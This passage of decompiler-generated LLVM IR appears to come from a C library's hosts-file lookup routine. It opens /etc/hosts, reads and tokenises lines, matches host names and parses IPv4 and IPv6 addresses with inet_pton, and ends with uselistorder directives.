  br i1 %tmp49, label %dec_label_pc_10028224, label %dec_label_pc_10027f78

dec_label_pc_10027f78:                            ; preds = %dec_label_pc_10027f70
  %v3_10027f78 = icmp eq i32 %arg4, 1
  %v1_10027f7c = add i32 %v0_10027f7c, 32
  store i32 %v1_10027f7c, i32* @r24, align 4
  %v1_10027f80 = add i32 %v0_10027f80, -32
  store i32 %v1_10027f80, i32* @r27, align 4
  br i1 %v3_10027f78, label %dec_label_pc_10028080, label %dec_label_pc_10027f88

dec_label_pc_10027f88:                            ; preds = %dec_label_pc_10027f78
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10027f90 = inttoptr i32 %arg8 to i32*
  store i32 -1, i32* %v2_10027f90, align 4
  %tmp50 = icmp ult i32 %v1_10027f80, 4
  br i1 %tmp50, label %dec_label_pc_10028224, label %dec_label_pc_10027f98

dec_label_pc_10027f98:                            ; preds = %dec_label_pc_10027f88
  %v0_10027f98 = load i32, i32* %r9.global-to-local, align 4
  %v1_10027f98 = add i32 %v0_10027f98, -36
  store i32 %v1_10027f98, i32* %r0.global-to-local, align 4
  %tmp51 = icmp ult i32 %v1_10027f98, 8
  br i1 %tmp51, label %dec_label_pc_10028224, label %dec_label_pc_10027fa4

dec_label_pc_10027fa4:                            ; preds = %dec_label_pc_10027f98
  %v0_10027fa4 = load i32, i32* @r27, align 4
  %tmp52 = icmp ult i32 %v0_10027fa4, 16
  br i1 %tmp52, label %dec_label_pc_10028224, label %dec_label_pc_10027fac

dec_label_pc_10027fac:                            ; preds = %dec_label_pc_10027fa4
  %v1_10027fac = add i32 %v0_10027f98, -48
  store i32 %v1_10027fac, i32* %r0.global-to-local, align 4
  %tmp53 = icmp ult i32 %v1_10027fac, 8
  br i1 %tmp53, label %dec_label_pc_10028224, label %dec_label_pc_10027fb8

dec_label_pc_10027fb8:                            ; preds = %dec_label_pc_10027fac
  %v1_10027fb8 = add i32 %v0_10027f98, -56
  store i32 %v1_10027fb8, i32* %r0.global-to-local, align 4
  %v1_10027fbc = add i32 %v0_10027f98, -44
  store i32 %v1_10027fbc, i32* @r27, align 4
  %v3_10027fc0 = icmp ugt i32 %v1_10027fb8, %v1_10027fbc
  %v0_10027fc4 = load i32, i32* @r30, align 4
  %v1_10027fc4 = add i32 %v0_10027fc4, 36
  store i32 %v1_10027fc4, i32* @r29, align 4
  %v1_10027fc8 = add i32 %v0_10027fc4, 48
  store i32 %v1_10027fc8, i32* @r26, align 4
  %v1_10027fcc = add i32 %v0_10027fc4, 44
  store i32 %v1_10027fcc, i32* @r31, align 4
  br i1 %v3_10027fc0, label %dec_label_pc_10027fdc, label %dec_label_pc_10027fd4

dec_label_pc_10027fd4:                            ; preds = %dec_label_pc_10027fb8
  store i32 %v1_10027fb8, i32* @r27, align 4
  %v1_10027fd8 = add i32 %v0_10027fc4, 56
  store i32 %v1_10027fd8, i32* @r31, align 4
  br label %dec_label_pc_10027fdc

dec_label_pc_10027fdc:                            ; preds = %dec_label_pc_10027fb8, %dec_label_pc_10027fd4
  %v0_10027fdc = phi i32 [ %v1_10027fb8, %dec_label_pc_10027fd4 ], [ %v1_10027fbc, %dec_label_pc_10027fb8 ]
  %tmp54 = icmp ult i32 %v0_10027fdc, 80
  br i1 %tmp54, label %dec_label_pc_10028224, label %dec_label_pc_10027fe4

dec_label_pc_10027fe4:                            ; preds = %dec_label_pc_10027fdc
  store i32 268599272, i32* @lr, align 4
  %v0_10027fe4 = call i32 @__open_etc_hosts()
  store i32 %v0_10027fe4, i32* @r20, align 4
  %v3_10027fe8 = icmp eq i32 %v0_10027fe4, 0
  br i1 %v3_10027fe8, label %dec_label_pc_10028008, label %dec_label_pc_10027ff0

dec_label_pc_10027ff0:                            ; preds = %dec_label_pc_10027fe4
  %v0_10027ff0 = load i32, i32* @r24, align 4
  store i32 %v0_10027ff0, i32* @r25, align 4
  %v0_10027ff4 = load i32, i32* @r29, align 4
  store i32 %v0_10027ff4, i32* @r22, align 4
  %v0_10027ff8 = load i32, i32* @r26, align 4
  store i32 %v0_10027ff8, i32* @r23, align 4
  %v0_10027ffc = load i32, i32* @r31, align 4
  store i32 %v0_10027ffc, i32* @r24, align 4
  store i32 %v0_10027ff0, i32* @r21, align 4
  %v1_10028098.pre = load i32, i32* @r16, align 4
  br label %dec_label_pc_10028090

dec_label_pc_10028008:                            ; preds = %dec_label_pc_10027fe4
  %v1_10028008 = load i32, i32* @r17, align 4
  %v2_10028008 = inttoptr i32 %v1_10028008 to i32*
  store i32 0, i32* %v2_10028008, align 4
  %v0_1002800c = call i32 @__errno_location()
  %v1_10028010 = inttoptr i32 %v0_1002800c to i32*
  %v2_10028010 = load i32, i32* %v1_10028010, align 4
  store i32 %v2_10028010, i32* @r26, align 4
  br label %dec_label_pc_10028228

dec_label_pc_10028018:                            ; preds = %dec_label_pc_100281b8
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1002801c = load i32, i32* @r25, align 4
  %v1_1002801c = load i32, i32* @r22, align 4
  %v2_1002801c = inttoptr i32 %v1_1002801c to i32*
  store i32 %v0_1002801c, i32* %v2_1002801c, align 4
  %v0_10028020 = load i32, i32* %r0.global-to-local, align 4
  %v1_10028020 = load i32, i32* @r22, align 4
  %v2_10028020 = add i32 %v1_10028020, 4
  %v3_10028020 = inttoptr i32 %v2_10028020 to i32*
  store i32 %v0_10028020, i32* %v3_10028020, align 4
  %v0_10028024 = load i32, i32* @r30, align 4
  %v1_10028024 = add i32 %v0_10028024, 8
  store i32 %v1_10028024, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_1002802c = add i32 %v0_10028024, 4
  %v2_1002802c = inttoptr i32 %v1_1002802c to i32*
  %v3_1002802c = load i32, i32* %v2_1002802c, align 4
  store i32 %v3_1002802c, i32* %r0.global-to-local, align 4
  %v0_10028030 = load i32, i32* @r19, align 4
  %v1_10028030 = load i32, i32* @r28, align 4
  %v2_10028030 = add i32 %v1_10028030, 8
  %v3_10028030 = inttoptr i32 %v2_10028030 to i32*
  store i32 %v0_10028030, i32* %v3_10028030, align 4
  %v0_10028034 = load i32, i32* %r0.global-to-local, align 4
  %v1_10028034 = load i32, i32* @r28, align 4
  %v2_10028034 = inttoptr i32 %v1_10028034 to i32*
  store i32 %v0_10028034, i32* %v2_10028034, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_1002803c = load i32, i32* @r28, align 4
  %v2_1002803c = add i32 %v1_1002803c, 12
  %v3_1002803c = inttoptr i32 %v2_1002803c to i32*
  store i32 4, i32* %v3_1002803c, align 4
  %v0_10028040 = load i32, i32* @r22, align 4
  %v1_10028040 = load i32, i32* @r28, align 4
  %v2_10028040 = add i32 %v1_10028040, 16
  %v3_10028040 = inttoptr i32 %v2_10028040 to i32*
  store i32 %v0_10028040, i32* %v3_10028040, align 4
  br label %dec_label_pc_10028074

dec_label_pc_10028048:                            ; preds = %dec_label_pc_100281dc
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1002804c = load i32, i32* @r21, align 4
  %v1_1002804c = load i32, i32* @r23, align 4
  %v2_1002804c = inttoptr i32 %v1_1002804c to i32*
  store i32 %v0_1002804c, i32* %v2_1002804c, align 4
  %v0_10028050 = load i32, i32* %r0.global-to-local, align 4
  %v1_10028050 = load i32, i32* @r23, align 4
  %v2_10028050 = add i32 %v1_10028050, 4
  %v3_10028050 = inttoptr i32 %v2_10028050 to i32*
  store i32 %v0_10028050, i32* %v3_10028050, align 4
  %v0_10028054 = load i32, i32* @r30, align 4
  %v1_10028054 = add i32 %v0_10028054, 8
  store i32 %v1_10028054, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_1002805c = add i32 %v0_10028054, 4
  %v2_1002805c = inttoptr i32 %v1_1002805c to i32*
  %v3_1002805c = load i32, i32* %v2_1002805c, align 4
  store i32 %v3_1002805c, i32* %r0.global-to-local, align 4
  %v0_10028060 = load i32, i32* @r19, align 4
  %v1_10028060 = load i32, i32* @r28, align 4
  %v2_10028060 = add i32 %v1_10028060, 8
  %v3_10028060 = inttoptr i32 %v2_10028060 to i32*
  store i32 %v0_10028060, i32* %v3_10028060, align 4
  %v0_10028064 = load i32, i32* %r0.global-to-local, align 4
  %v1_10028064 = load i32, i32* @r28, align 4
  %v2_10028064 = inttoptr i32 %v1_10028064 to i32*
  store i32 %v0_10028064, i32* %v2_10028064, align 4
  store i32 16, i32* %r0.global-to-local, align 4
  %v1_1002806c = load i32, i32* @r28, align 4
  %v2_1002806c = add i32 %v1_1002806c, 12
  %v3_1002806c = inttoptr i32 %v2_1002806c to i32*
  store i32 16, i32* %v3_1002806c, align 4
  %v0_10028070 = load i32, i32* @r23, align 4
  %v1_10028070 = load i32, i32* @r28, align 4
  %v2_10028070 = add i32 %v1_10028070, 16
  %v3_10028070 = inttoptr i32 %v2_10028070 to i32*
  store i32 %v0_10028070, i32* %v3_10028070, align 4
  br label %dec_label_pc_10028074

dec_label_pc_10028074:                            ; preds = %dec_label_pc_10028018, %dec_label_pc_10028048
  %v0_10028074 = load i32, i32* %r9.global-to-local, align 4
  %v1_10028074 = load i32, i32* @r28, align 4
  %v2_10028074 = add i32 %v1_10028074, 4
  %v3_10028074 = inttoptr i32 %v2_10028074 to i32*
  store i32 %v0_10028074, i32* %v3_10028074, align 4
  %v0_10028078 = load i32, i32* @r28, align 4
  %v1_10028078 = load i32, i32* @r17, align 4
  %v2_10028078 = inttoptr i32 %v1_10028078 to i32*
  store i32 %v0_10028078, i32* %v2_10028078, align 4
  br label %dec_label_pc_10028210

dec_label_pc_10028080:                            ; preds = %dec_label_pc_10027f78
  store i32 0, i32* @r25, align 4
  store i32 0, i32* @r22, align 4
  store i32 0, i32* @r21, align 4
  store i32 0, i32* @r23, align 4
  br label %dec_label_pc_10028090

dec_label_pc_10028090:                            ; preds = %dec_label_pc_10027ff0, %dec_label_pc_10028080
  %v1_10028098 = phi i32 [ %v1_10028098.pre, %dec_label_pc_10027ff0 ], [ %arg8, %dec_label_pc_10028080 ]
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r26, align 4
  %v2_10028098 = inttoptr i32 %v1_10028098 to i32*
  store i32 1, i32* %v2_10028098, align 4
  br label %dec_label_pc_100281f8

dec_label_pc_100280a0:                            ; preds = %dec_label_pc_100281f8
  %v0_100280a0 = load i32, i32* @r24, align 4
  store i32 %v0_100280a0, i32* @r3, align 4
  store i32 268599468, i32* @lr, align 4
  %v2_100280a8 = call i32 @__GI_strchr(i32 %v0_100280a0, i32 35)
  %v4_100280ac = icmp eq i32 %v2_100280a8, 0
  br i1 %v4_100280ac, label %dec_label_pc_100280bc, label %dec_label_pc_100280b4

dec_label_pc_100280b4:                            ; preds = %dec_label_pc_100280a0
  %v3_100280a8 = inttoptr i32 %v2_100280a8 to i8*
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %v3_100280a8, align 1
  br label %dec_label_pc_100280bc

dec_label_pc_100280bc:                            ; preds = %dec_label_pc_100280a0, %dec_label_pc_100280b4
  %v0_100280bc = load i32, i32* @r24, align 4
  store i32 %v0_100280bc, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  %v1_1002813817 = inttoptr i32 %v0_100280bc to i8*
  %v2_1002813818 = load i8, i8* %v1_1002813817, align 1
  %v3_1002813819 = zext i8 %v2_1002813818 to i32
  store i32 %v3_1002813819, i32* %r0.global-to-local, align 4
  %v3_1002813c21 = icmp eq i8 %v2_1002813818, 0
  br i1 %v3_1002813c21, label %dec_label_pc_10028144, label %dec_label_pc_100280d4.preheader

dec_label_pc_100280c8:                            ; preds = %dec_label_pc_100280e4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_100280cc = inttoptr i32 %v0_10028108 to i8*
  store i8 0, i8* %v3_100280cc, align 1
  %v0_100280d0 = load i32, i32* %r11.global-to-local, align 4
  %v1_100280d0 = add i32 %v0_100280d0, 1
  store i32 %v1_100280d0, i32* %r11.global-to-local, align 4
  %v1_100280d4 = inttoptr i32 %v1_100280d0 to i8*
  %v2_100280d4 = load i8, i8* %v1_100280d4, align 1
  %v3_100280d4 = zext i8 %v2_100280d4 to i32
  store i32 %v3_100280d4, i32* %r0.global-to-local, align 4
  %v3_100280d8 = icmp eq i8 %v2_100280d4, 0
  %v1_100280dc = mul nuw nsw i32 %v3_100280d4, 2
  store i32 %v1_100280dc, i32* @r10, align 4
  br i1 %v3_100280d8, label %dec_label_pc_10028144, label %dec_label_pc_100280e4

dec_label_pc_100280e4:                            ; preds = %dec_label_pc_100280d4.preheader, %dec_label_pc_100280c8
  %v0_10028108 = phi i32 [ %v1_100280d0, %dec_label_pc_100280c8 ], [ %v0_100280d42, %dec_label_pc_100280d4.preheader ]
  %v0_100280ec = phi i32 [ %v1_100280dc, %dec_label_pc_100280c8 ], [ %v1_100280dc8, %dec_label_pc_100280d4.preheader ]
  %v3_100280e8 = load i32, i32* @global_var_1004515c, align 4
  store i32 %v3_100280e8, i32* %r9.global-to-local, align 4
  %v2_100280ec = add i32 %v3_100280e8, %v0_100280ec
  %v3_100280ec = inttoptr i32 %v2_100280ec to i16*
  %v4_100280ec = load i16, i16* %v3_100280ec, align 2
  %v5_100280ec = zext i16 %v4_100280ec to i32
  store i32 %v5_100280ec, i32* %r0.global-to-local, align 4
  %v1_100280f0 = and i32 %v5_100280ec, 32
  store i32 %v1_100280f0, i32* %r9.global-to-local, align 4
  %v3_100280f0 = icmp eq i32 %v1_100280f0, 0
  br i1 %v3_100280f0, label %dec_label_pc_100280f8, label %dec_label_pc_100280c8

dec_label_pc_100280f8:                            ; preds = %dec_label_pc_100280e4
  %v0_100280f8 = load i32, i32* @r29, align 4
  %v2_100280f8 = icmp sgt i32 %v0_100280f8, 6
  br i1 %v2_100280f8, label %dec_label_pc_10028114.preheader, label %dec_label_pc_10028100

dec_label_pc_10028100:                            ; preds = %dec_label_pc_100280f8
  %v1_10028100 = mul i32 %v0_100280f8, 4
  store i32 %v1_10028100, i32* %r0.global-to-local, align 4
  %v1_10028104 = add i32 %v0_100280f8, 1
  store i32 %v1_10028104, i32* @r29, align 4
  %v1_10028108 = load i32, i32* @r30, align 4
  %v3_10028108 = add i32 %v1_10028108, %v1_10028100
  %v4_10028108 = inttoptr i32 %v3_10028108 to i32*
  store i32 %v0_10028108, i32* %v4_10028108, align 4
  %v0_100281149.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10028114.preheader

dec_label_pc_10028114.preheader:                  ; preds = %dec_label_pc_10028100, %dec_label_pc_100280f8
  %v0_100281149 = phi i32 [ %v0_100281149.pre, %dec_label_pc_10028100 ], [ %v0_10028108, %dec_label_pc_100280f8 ]
  %v1_1002811410 = inttoptr i32 %v0_100281149 to i8*
  %v2_1002811411 = load i8, i8* %v1_1002811410, align 1
  %v3_1002811412 = zext i8 %v2_1002811411 to i32
  store i32 %v3_1002811412, i32* %r0.global-to-local, align 4
  %v3_1002811814 = icmp eq i8 %v2_1002811411, 0
  %v1_1002811c15 = mul nuw nsw i32 %v3_1002811412, 2
  store i32 %v1_1002811c15, i32* @r10, align 4
  br i1 %v3_1002811814, label %dec_label_pc_10028138.loopexit, label %dec_label_pc_10028124.lr.ph

dec_label_pc_10028124.lr.ph:                      ; preds = %dec_label_pc_10028114.preheader
  %v3_10028128.pre = load i32, i32* @global_var_1004515c, align 4
  br label %dec_label_pc_10028124

dec_label_pc_10028110:                            ; preds = %dec_label_pc_10028124
  %v1_10028110 = add i32 %v0_10028110, 1
  store i32 %v1_10028110, i32* %r11.global-to-local, align 4
  %v1_10028114 = inttoptr i32 %v1_10028110 to i8*
  %v2_10028114 = load i8, i8* %v1_10028114, align 1
  %v3_10028114 = zext i8 %v2_10028114 to i32
  store i32 %v3_10028114, i32* %r0.global-to-local, align 4
  %v3_10028118 = icmp eq i8 %v2_10028114, 0
  %v1_1002811c = mul nuw nsw i32 %v3_10028114, 2
  store i32 %v1_1002811c, i32* @r10, align 4
  br i1 %v3_10028118, label %dec_label_pc_10028138.loopexit, label %dec_label_pc_10028124

dec_label_pc_10028124:                            ; preds = %dec_label_pc_10028124.lr.ph, %dec_label_pc_10028110
  %v0_10028110 = phi i32 [ %v0_100281149, %dec_label_pc_10028124.lr.ph ], [ %v1_10028110, %dec_label_pc_10028110 ]
  %v0_1002812c = phi i32 [ %v1_1002811c15, %dec_label_pc_10028124.lr.ph ], [ %v1_1002811c, %dec_label_pc_10028110 ]
  store i32 %v3_10028128.pre, i32* %r9.global-to-local, align 4
  %v2_1002812c = add i32 %v0_1002812c, %v3_10028128.pre
  %v3_1002812c = inttoptr i32 %v2_1002812c to i16*
  %v4_1002812c = load i16, i16* %v3_1002812c, align 2
  %v5_1002812c = zext i16 %v4_1002812c to i32
  store i32 %v5_1002812c, i32* %r0.global-to-local, align 4
  %v1_10028130 = and i32 %v5_1002812c, 32
  store i32 %v1_10028130, i32* %r9.global-to-local, align 4
  %v3_10028130 = icmp eq i32 %v1_10028130, 0
  br i1 %v3_10028130, label %dec_label_pc_10028110, label %dec_label_pc_10028138.loopexit

dec_label_pc_10028138.loopexit:                   ; preds = %dec_label_pc_10028124, %dec_label_pc_10028110, %dec_label_pc_10028114.preheader
  %v0_10028138 = phi i32 [ %v0_100281149, %dec_label_pc_10028114.preheader ], [ %v0_10028110, %dec_label_pc_10028124 ], [ %v1_10028110, %dec_label_pc_10028110 ]
  %v1_10028138 = inttoptr i32 %v0_10028138 to i8*
  %v2_10028138 = load i8, i8* %v1_10028138, align 1
  %v3_10028138 = zext i8 %v2_10028138 to i32
  store i32 %v3_10028138, i32* %r0.global-to-local, align 4
  %v3_1002813c = icmp eq i8 %v2_10028138, 0
  br i1 %v3_1002813c, label %dec_label_pc_10028144, label %dec_label_pc_100280d4.preheader

dec_label_pc_100280d4.preheader:                  ; preds = %dec_label_pc_100280bc, %dec_label_pc_10028138.loopexit
  %v0_100280d42 = phi i32 [ %v0_10028138, %dec_label_pc_10028138.loopexit ], [ %v0_100280bc, %dec_label_pc_100280bc ]
  %v1_100280d43 = inttoptr i32 %v0_100280d42 to i8*
  %v2_100280d44 = load i8, i8* %v1_100280d43, align 1
  %v3_100280d45 = zext i8 %v2_100280d44 to i32
  store i32 %v3_100280d45, i32* %r0.global-to-local, align 4
  %v3_100280d87 = icmp eq i8 %v2_100280d44, 0
  %v1_100280dc8 = mul nuw nsw i32 %v3_100280d45, 2
  store i32 %v1_100280dc8, i32* @r10, align 4
  br i1 %v3_100280d87, label %dec_label_pc_10028144, label %dec_label_pc_100280e4

dec_label_pc_10028144:                            ; preds = %dec_label_pc_10028138.loopexit, %dec_label_pc_100280d4.preheader, %dec_label_pc_100280c8, %dec_label_pc_100280bc
  %v0_10028144 = load i32, i32* @r29, align 4
  %v1_10028148 = mul i32 %v0_10028144, 4
  store i32 %v1_10028148, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10028150 = load i32, i32* @r30, align 4
  %v3_10028150 = add i32 %v2_10028150, %v1_10028148
  %v4_10028150 = inttoptr i32 %v3_10028150 to i32*
  store i32 0, i32* %v4_10028150, align 4
  %tmp55 = icmp slt i32 %v0_10028144, 2
  br i1 %tmp55, label %dec_label_pc_100281f8, label %dec_label_pc_10028158

dec_label_pc_10028158:                            ; preds = %dec_label_pc_10028144
  %v0_10028158 = load i32, i32* @r18, align 4
  %v3_10028158 = icmp eq i32 %v0_10028158, 1
  br i1 %v3_10028158, label %dec_label_pc_10028210, label %dec_label_pc_10028160

dec_label_pc_10028160:                            ; preds = %dec_label_pc_10028158
  %v3_10028160 = icmp eq i32 %v0_10028158, 2
  store i32 1, i32* @r31, align 4
  br i1 %v3_10028160, label %dec_label_pc_1002816c, label %dec_label_pc_10028198.preheader

dec_label_pc_10028198.preheader:                  ; preds = %dec_label_pc_10028160
  %v1_1002819823 = load i32, i32* @r29, align 4
  %v2_1002819824 = icmp sgt i32 %v1_1002819823, 1
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_100281a029 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_100281a029, i32* @r3, align 4
  br i1 %v2_1002819824, label %dec_label_pc_10028184, label %dec_label_pc_100281a8

dec_label_pc_1002816c:                            ; preds = %dec_label_pc_10028160
  %v0_1002816c = load i32, i32* @r30, align 4
  %v1_1002816c = inttoptr i32 %v0_1002816c to i32*
  %v2_1002816c = load i32, i32* %v1_1002816c, align 4
  store i32 %v2_1002816c, i32* @r4, align 4
  %v0_10028170 = load i32, i32* %r15.global-to-local, align 4
  %v2_10028174 = inttoptr i32 %v0_10028170 to i8*
  %v3_10028174 = call i32 @__GI_strcoll(i8* %v2_10028174, i32 %v2_1002816c)
  %v3_10028178 = icmp eq i32 %v3_10028174, 0
  br i1 %v3_10028178, label %dec_label_pc_100281b0, label %dec_label_pc_100281f8

dec_label_pc_10028184:                            ; preds = %dec_label_pc_10028198.preheader, %dec_label_pc_10028194
  %v1_10028184 = phi i32 [ %v1_1002819c, %dec_label_pc_10028194 ], [ 4, %dec_label_pc_10028198.preheader ]
  %v0_100281a031 = phi i32 [ %v0_100281a0, %dec_label_pc_10028194 ], [ %v0_100281a029, %dec_label_pc_10028198.preheader ]
  %v0_10028184 = load i32, i32* @r30, align 4
  %v2_10028184 = add i32 %v0_10028184, %v1_10028184
  %v3_10028184 = inttoptr i32 %v2_10028184 to i32*
  %v4_10028184 = load i32, i32* %v3_10028184, align 4
  store i32 %v4_10028184, i32* @r4, align 4
  %v2_10028188 = call i32 @__GI_strcasecmp(i32 %v0_100281a031, i32 %v4_10028184)
  %v3_1002818c = icmp eq i32 %v2_10028188, 0
  %v0_100281a8.pre = load i32, i32* @r31, align 4
  br i1 %v3_1002818c, label %dec_label_pc_10028184.dec_label_pc_100281a8_crit_edge, label %dec_label_pc_10028194

dec_label_pc_10028194:                            ; preds = %dec_label_pc_10028184
  %v1_10028194 = add i32 %v0_100281a8.pre, 1
  store i32 %v1_10028194, i32* @r31, align 4
  %v1_10028198 = load i32, i32* @r29, align 4
  %v2_10028198 = icmp slt i32 %v1_10028194, %v1_10028198
  %v1_1002819c = mul i32 %v1_10028194, 4
  store i32 %v1_1002819c, i32* %r0.global-to-local, align 4
  %v0_100281a0 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_100281a0, i32* @r3, align 4
  br i1 %v2_10028198, label %dec_label_pc_10028184, label %dec_label_pc_100281a8

dec_label_pc_10028184.dec_label_pc_100281a8_crit_edge: ; preds = %dec_label_pc_10028184
  %v1_100281a8.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100281a8

dec_label_pc_100281a8:                            ; preds = %dec_label_pc_10028194, %dec_label_pc_10028184.dec_label_pc_100281a8_crit_edge, %dec_label_pc_10028198.preheader
  %v1_100281a8 = phi i32 [ %v1_100281a8.pre, %dec_label_pc_10028184.dec_label_pc_100281a8_crit_edge ], [ %v1_1002819823, %dec_label_pc_10028198.preheader ], [ %v1_10028198, %dec_label_pc_10028194 ]
  %v0_100281a8 = phi i32 [ %v0_100281a8.pre, %dec_label_pc_10028184.dec_label_pc_100281a8_crit_edge ], [ 1, %dec_label_pc_10028198.preheader ], [ %v1_10028194, %dec_label_pc_10028194 ]
  %v2_100281a8 = icmp slt i32 %v0_100281a8, %v1_100281a8
  br i1 %v2_100281a8, label %dec_label_pc_100281b0, label %dec_label_pc_100281f8

dec_label_pc_100281b0:                            ; preds = %dec_label_pc_1002816c, %dec_label_pc_100281a8
  %v0_100281b0 = load i32, i32* @r19, align 4
  %v3_100281b0 = icmp eq i32 %v0_100281b0, 2
  br i1 %v3_100281b0, label %dec_label_pc_100281b8, label %dec_label_pc_100281d4

dec_label_pc_100281b8:                            ; preds = %dec_label_pc_100281b0
  %v0_100281b8 = load i32, i32* @r30, align 4
  %v1_100281b8 = inttoptr i32 %v0_100281b8 to i32*
  %v2_100281b8 = load i32, i32* %v1_100281b8, align 4
  store i32 %v2_100281b8, i32* @r4, align 4
  %v0_100281c0 = load i32, i32* @r25, align 4
  store i32 %v0_100281c0, i32* @r5, align 4
  store i32 268599752, i32* @lr, align 4
  %v3_100281c4 = call i32 @inet_pton(i32 2)
  %v2_100281c8 = icmp sgt i32 %v3_100281c4, 0
  br i1 %v2_100281c8, label %dec_label_pc_10028018, label %dec_label_pc_100281f4

dec_label_pc_100281d4:                            ; preds = %dec_label_pc_100281b0
  %v3_100281d4 = icmp eq i32 %v0_100281b0, 10
  br i1 %v3_100281d4, label %dec_label_pc_100281dc, label %dec_label_pc_100281f4

dec_label_pc_100281dc:                            ; preds = %dec_label_pc_100281d4
  %v0_100281dc = load i32, i32* @r30, align 4
  %v1_100281dc = inttoptr i32 %v0_100281dc to i32*
  %v2_100281dc = load i32, i32* %v1_100281dc, align 4
  store i32 %v2_100281dc, i32* @r4, align 4
  %v0_100281e4 = load i32, i32* @r21, align 4
  store i32 %v0_100281e4, i32* @r5, align 4
  store i32 268599788, i32* @lr, align 4
  %v3_100281e8 = call i32 @inet_pton(i32 10)
  %v2_100281ec = icmp sgt i32 %v3_100281e8, 0
  br i1 %v2_100281ec, label %dec_label_pc_10028048, label %dec_label_pc_100281f4

dec_label_pc_100281f4:                            ; preds = %dec_label_pc_100281b8, %dec_label_pc_100281d4, %dec_label_pc_100281dc
  store i32 2, i32* @r26, align 4
  br label %dec_label_pc_100281f8

dec_label_pc_100281f8:                            ; preds = %dec_label_pc_100281a8, %dec_label_pc_1002816c, %dec_label_pc_10028144, %dec_label_pc_100281f4, %dec_label_pc_10028090
  %v0_100281f8 = load i32, i32* @r24, align 4
  %v0_100281fc = load i32, i32* @r27, align 4
  %v0_10028200 = load i32, i32* @r20, align 4
  store i32 268599816, i32* @lr, align 4
  %v3_10028204 = call i32 @fgets(i32 %v0_100281f8, i32 %v0_100281fc, i32 %v0_10028200)
  %v3_10028208 = icmp eq i32 %v3_10028204, 0
  br i1 %v3_10028208, label %dec_label_pc_10028210, label %dec_label_pc_100280a0

dec_label_pc_10028210:                            ; preds = %dec_label_pc_100281f8, %dec_label_pc_10028158, %dec_label_pc_10028074
  %v0_10028210 = load i32, i32* @r18, align 4
  %v3_10028210 = icmp eq i32 %v0_10028210, 1
  br i1 %v3_10028210, label %dec_label_pc_10028228, label %dec_label_pc_10028218

dec_label_pc_10028218:                            ; preds = %dec_label_pc_10028210
  %v0_10028218 = load i32, i32* @r20, align 4
  store i32 ptrtoint (i32* @global_var_10028220.1423 to i32), i32* @lr, align 4
  %v1_1002821c = inttoptr i32 %v0_10028218 to i16*
  %v2_1002821c = call i32 @__GI_fclose(i16* %v1_1002821c)
  br label %dec_label_pc_10028228

dec_label_pc_10028224:                            ; preds = %dec_label_pc_10027fdc, %dec_label_pc_10027fac, %dec_label_pc_10027fa4, %dec_label_pc_10027f98, %dec_label_pc_10027f88, %dec_label_pc_10027f70, %dec_label_pc_10027f60
  store i32 34, i32* @r26, align 4
  br label %dec_label_pc_10028228

dec_label_pc_10028228:                            ; preds = %dec_label_pc_10028210, %dec_label_pc_10028218, %dec_label_pc_10028008, %dec_label_pc_10028224
  store i32 %v0_10027f24, i32* %r0.global-to-local, align 4
  %v0_1002822c = load i32, i32* @r26, align 4
  ret i32 %v0_1002822c

; uselistorder directives
  uselistorder i32 %v0_100281a0, { 1, 0 }
  uselistorder i32 %v1_10028194, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10028148, { 1, 0 }
  uselistorder i32 %v0_10028144, { 1, 0 }
  uselistorder i32 %v0_100280d42, { 1, 0 }
  uselistorder i32 %v1_1002811c, { 1, 0 }
  uselistorder i32 %v1_1002811c15, { 1, 0 }
  uselistorder i32 %v1_10028100, { 1, 0 }
  uselistorder i32 %v0_100280f8, { 1, 0, 2 }
  uselistorder i32 %v1_100280dc, { 1, 0 }
  uselistorder i32 %v2_100280a8, { 1, 0 }
  uselistorder i32 %v0_10027f98, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10027f70.pr, { 1, 0, 2 }
  uselistorder i32 %v1_10027f3c, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 5, 6, 7, 8, 9, 3, 2, 4, 10, 11, 0, 1 }
  uselistorder i32* %r15.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r11.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 4, 15, 3, 16, 0, 23, 17, 18, 1, 19, 20, 22, 21, 2, 24, 25, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 26, 27, 28, 29, 30 }
  uselistorder i32 34, { 19, 20, 4, 5, 13, 14, 17, 6, 7, 18, 0, 15, 16, 21, 22, 10, 11, 12, 23, 8, 1, 2, 3, 9 }
  uselistorder i32 (i16*)* @__GI_fclose, { 6, 7, 0, 2, 3, 1, 4, 5, 8 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 2, 1, 19, 0, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 10, { 20, 86, 87, 88, 89, 90, 91, 92, 11, 53, 93, 94, 12, 3, 100, 4, 101, 1, 13, 21, 104, 22, 83, 23, 84, 99, 14, 54, 24, 25, 26, 55, 15, 56, 97, 60, 61, 57, 58, 59, 96, 95, 77, 16, 78, 39, 40, 41, 42, 43, 7, 27, 44, 45, 28, 46, 47, 48, 29, 49, 30, 50, 51, 31, 5, 6, 2, 52, 98, 102, 103, 75, 32, 0, 17, 33, 8, 34, 9, 19, 18, 63, 35, 62, 64, 65, 36, 66, 37, 67, 68, 69, 70, 71, 72, 73, 74, 76, 10, 79, 80, 81, 82, 85, 38 }
  uselistorder i32 (i32)* @inet_pton, { 2, 1, 0, 3, 5, 4 }
